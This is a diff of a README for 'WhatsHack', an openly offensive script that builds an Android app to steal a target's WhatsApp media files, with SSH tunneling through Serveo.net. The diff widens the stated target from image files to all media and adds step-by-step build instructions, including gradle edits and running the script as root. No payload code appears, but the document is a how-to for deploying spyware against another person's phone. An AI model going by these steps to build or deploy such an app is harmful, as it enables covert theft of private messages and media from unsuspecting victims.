@@ -1,11 +1,13 @@
-# WhatsHack v1.0
+# WhatsHack v1.1
 ## Author: https://github.com/thelinuxchoice/whatshack
-## IG: https://www.instagram.com/thelinuxchoice
+## IG: https://www.instagram.com/linux_choice
 ### Don't copy this code without give me the credits, nerd! 
 
-Script to generate Android App to Hack WhatsApp Image Files.
+Script to generate Android App to Hack All WhatsApp Media Files.
 
-![wh](https://user-images.githubusercontent.com/34893261/44694279-02204480-aa43-11e8-8469-43c5d254aabd.png)
+![whats1](https://user-images.githubusercontent.com/34893261/44965650-0948c600-af0d-11e8-9ae3-3c771eade60b.png)
+![whats2](https://user-images.githubusercontent.com/34893261/44965651-09e15c80-af0d-11e8-95fa-3d53a92352b8.png)
+
 
 ### Features:
 #### Port Forwarding using SSH Tunneling with Serveo.net
@@ -35,7 +37,7 @@ Download Android Studio:
 https://developer.android.com/studio
 
 Installing Android Studio:
-# unzip ~/Download/android*.zip -d /opt
+# unzip ~/Downloads/android*.zip -d /opt
 
 For AMD64 Arch, Install Android Studio dependencies:
 # apt-get install lib32z1 lib32ncurses6 lib32stdc++6
@@ -53,8 +55,28 @@ Run script:
 # cd whatshack/
 # bash whatshack.sh
 
-```
 
+On First Time, Choose "n" when asks to build, then open the project on Android Studio:
+cd /opt/android-studio/bin
+./studio.sh
+
+Import Gradle Project:
+Choose whatshack app folder: whatshack/app/
+
+Wait all dependencies downloading, if you got errors, click on showed links to solve.
+Try build from Android Studio: Build > build APK's
+Click on showed links if you got errors.
+Close Android after building successfully.
+
+open with any Text Editor the file app/build.gradle
+
+remove "google()"
+change gradle version from: 3.4.1 to: 2.2.0
+save and exit.
+
+Run script (as root):
+# bash whatshack.sh
+```
 ### Donate!
 Support the authors:
 
